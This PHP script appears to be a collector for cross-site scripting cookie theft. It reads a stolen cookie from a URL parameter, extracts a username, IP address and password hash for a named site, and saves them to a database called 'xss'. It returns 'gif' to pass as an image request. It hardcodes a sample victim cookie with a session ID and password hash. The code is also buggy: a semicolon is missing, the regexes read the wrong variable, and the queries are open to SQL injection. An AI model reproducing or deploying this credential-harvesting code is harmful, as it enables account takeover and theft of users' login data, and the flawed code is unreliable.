<?
error_reporting(6143);
$cookie=""
$cookie = $_GET['c'];
if( strlen($cookie) == 0 )
{
	$cookie = 'AJSTAT_ok_times=2; web_sx=2008-12-11 18:03:04; jishuqi=111.96.56.194; AJSTAT_ok_pages=6; hysj=2008-12-12+10%3a20%3a17; hyline=2008-12-12+11%3a10%3a23; ASP.NET_SessionId=m4jo1u55lnr35h3onzvd2l45; bt=%5bem15%5d; yzm=; jiaonan.net=huiyuan=newcn&hypwd=b79a630dfc35d8f28080f72d8b220abd&jst_fs=False';
}

print preg_match("/huiyuan=(\w+)/i",$a, $name);
print preg_match("/jishuqi=([0-9.]+)/i",$a, $ip);
print preg_match("/hypwd=(\w+)/i",$a, $pw);
$name=$name[1];
$ip = $ip[1];
$pw = $pw[1];
//print "\r\n";
//print $name[1];
//print $ip[1];
//print $pw[1];
print "gif";

$db = mysql_connect('127.0.0.1', 'xss', 'xss1');
mysql_select_db("xss");
$query = "SELECT count(1) FROM xss where name= '$name' ";
$r = mysql_query( $query );
$row = mysql_fetch_row($r);
//print $row[0];
if ( $row[0]!=1)
{
	$query = "insert into xss (name, ip, pw)values('$name','$ip','$pw')";
	mysql_query( $query );
}
else
{
	$query = "update xss set ip='$ip', pw='$pw' where name='$name' ";
	mysql_query( $query );
}
	
mysql_close();


//print "\r\n".'finished';
?>